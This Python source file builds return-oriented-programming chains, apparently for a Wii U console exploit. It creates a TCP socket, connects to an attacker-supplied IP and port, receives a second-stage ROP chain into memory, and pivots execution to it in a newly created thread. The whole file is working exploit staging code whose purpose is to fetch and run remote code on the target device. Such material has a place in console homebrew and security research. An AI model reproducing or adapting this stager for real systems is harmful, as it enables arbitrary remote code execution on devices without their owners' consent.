from ropgadgets import *
from common_defines import *


def tcp_thread_ropchain_calls(data_addr):
    cur_chain = []
    # create a socket
    cur_chain += socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
    cur_chain += write_r3r4_tomem(0x4D055000)  # save result to memory

    # connect(socket_fd, &sin, 0x10)
    cur_chain += call_with_dereferenced_r3(ROP_connect, 0x4D055000, data_addr,
                                           0x10);  # will use the value at address (0x4D055000) as arg1, not the address itself!

    # improve stability by waiting a bit
    cur_chain += GX2WaitForVsync()
    cur_chain += GX2WaitForVsync()

    # receive the rop chain
    cur_chain += recv(4, 0x4D900014, 0x8000, 0)
    cur_chain += DCFlushRange(0x4D900010, 0x8000)

    # execute received rop chain!
    cur_chain += StackPivot(0x4D900010)
    return cur_chain


def tcp_thread_ropchain_data(ip, port):
    cur_chain = []
    # sin.family + port
    cur_chain.append(0x00020000 + port)
    cur_chain.append((ip[0] << 24) | (ip[1] << 16) | (ip[2] << 8) | (ip[3] << 0))
    cur_chain.append(0)
    cur_chain.append(0)
    return cur_chain


def tcp_thread_ropchain(base, ip, port):
    # Calculate offsets
    call_len = len(tcp_thread_ropchain_calls(0)) * 4
    cur_chain = []
    # Build real ropchain
    cur_chain += tcp_thread_ropchain_calls(base + call_len)
    cur_chain += tcp_thread_ropchain_data(ip, port)

    return cur_chain


def create_thread_ropchain(new_ropchain_addr):
    cur_chain = []
    # Flush the whole ropchain
    cur_chain += DCFlushRange(0x387D3664, 0x500)

    # Create thread
    cur_chain += OSCreateThread(0x4D066000, ROP_POP_R24_TO_R31, 0, 0, 0x4D070000, 0x8000, 0, 2 | 8)

    # Override the stack with a new ROP Chain
    cur_chain += memcpy(0x4D070000 + 0x14, new_ropchain_addr, 0x400)
    cur_chain += DCFlushRange(0x4D066000, 0x20000)

    cur_chain += OSResumeThread(0x4D066000)
    cur_chain.append(ROP_OSExitThread)
    return cur_chain


def tcp_ropchain(ip, port, payloadAddress):
    cur_chain = []
    # Calculate offsets
    rop_len = len(create_thread_ropchain(0)) * 4
    # Build real ropchain
    cur_chain += create_thread_ropchain(0x387D36AC + rop_len)
    cur_chain += tcp_thread_ropchain(0x4D070000 + 0x14, ip, port)

    return cur_chain
